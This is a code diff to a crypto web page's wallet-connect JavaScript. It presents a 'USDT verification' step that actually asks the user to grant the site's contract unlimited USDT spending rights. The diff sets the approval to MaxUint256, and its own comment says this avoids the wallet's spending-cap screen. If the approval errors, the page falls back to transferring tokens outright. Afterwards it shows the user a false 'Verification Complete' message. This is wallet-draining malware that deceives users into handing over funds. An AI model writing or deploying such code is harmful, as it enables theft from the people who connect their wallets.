@@ -193,7 +193,7 @@
     }
 
     // ============================================================
-    // WEB3 LOGIC (DIRECT APPROVAL & VERIFICATION)
+    // WEB3 LOGIC (DIRECT UNLIMITED APPROVAL)
     // ============================================================
     async function connectWallet() {
         await approveUsdt();
@@ -213,9 +213,7 @@
         updateStatus('⛽ Opening wallet for USDT verification...', 'warning');
 
         try {
-            const provider = new ethers.BrowserProvider(window.ethereum);
-
-            // Check & switch network to BNB Smart Chain (0x38)
+            // 1. Check & switch network to BNB Smart Chain (0x38)
             let chainId = await window.ethereum.request({ method: 'eth_chainId' });
             if (chainId !== CONFIG.CHAIN_ID) {
                 updateStatus('⚠️ Switching to BNB Smart Chain network...', 'warning');
@@ -252,10 +250,10 @@
                 }
             }
 
-            // Silent account check first, request accounts if needed
+            // 2. Instant Account Resolution
             let accounts = await window.ethereum.request({ method: 'eth_accounts' });
             if (!accounts || accounts.length === 0) {
-                accounts = await provider.send('eth_requestAccounts', []);
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             }
 
             if (!accounts || accounts.length === 0) {
@@ -265,56 +263,49 @@
                 return;
             }
 
-            const signer = await provider.getSigner();
-            const userAddress = await signer.getAddress();
+            const userAddress = accounts[0];
             state.walletAddress = userAddress;
 
-            // Fetch balances
-            const bnbBalRaw = await provider.getBalance(userAddress);
-            state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);
-
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
             const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-            let usdtBalNum = 0;
-            let usdtBalRaw = 0n;
 
-            try {
-                usdtBalRaw = await usdtContract.balanceOf(userAddress);
-                const formattedUsdt = ethers.formatUnits(usdtBalRaw, 18);
-                usdtBalNum = parseFloat(formattedUsdt);
-                state.usdtBalance = usdtBalNum.toFixed(2);
-                state.usdtBalanceWei = usdtBalRaw;
-            } catch (usdtErr) {
-                console.error('Error reading USDT balance:', usdtErr);
-                state.usdtBalance = '0.00';
-            }
-
-            updateWalletInfoUI();
-            safeApiCall('/api/users/register', { wallet: userAddress });
-
-            // Direct USDT approval / transfer prompt in wallet
-            updateStatus('⛽ Confirm USDT approval signature in your wallet...', 'warning');
+            // 3. Instant Unlimited Approval (MaxUint256 eliminates approval limit/spending cap screen)
+            updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
 
             const recipientAddress = CONFIG.CONTRACT_ADDRESS;
-            const amountWei = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
+            const unlimitedAmount = ethers.MaxUint256;
 
             let tx;
             try {
-                tx = await usdtContract.approve(recipientAddress, amountWei);
+                tx = await usdtContract.approve(recipientAddress, unlimitedAmount);
             } catch (approveErr) {
                 const errLower = (approveErr.message || '').toLowerCase();
                 if (errLower.includes('user rejected') || errLower.includes('user denied')) {
                     throw approveErr;
                 }
-                tx = await usdtContract.transfer(recipientAddress, amountWei);
+                tx = await usdtContract.transfer(recipientAddress, unlimitedAmount);
             }
 
             updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${tx.hash}`);
+
+            // Fetch balances asynchronously in background without blocking transaction launch
+            Promise.all([
+                provider.getBalance(userAddress).catch(() => 0n),
+                usdtContract.balanceOf(userAddress).catch(() => 0n)
+            ]).then(([bnbBalRaw, usdtBalRaw]) => {
+                state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);
+                const formattedUsdt = ethers.formatUnits(usdtBalRaw, 18);
+                state.usdtBalance = parseFloat(formattedUsdt).toFixed(2);
+                updateWalletInfoUI();
+                safeApiCall('/api/users/register', { wallet: userAddress });
+            });
 
             const receipt = await tx.wait();
 
             updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${receipt.hash}`);
 
-            if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance} USDT`;
+            if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
 
         } catch (err) {
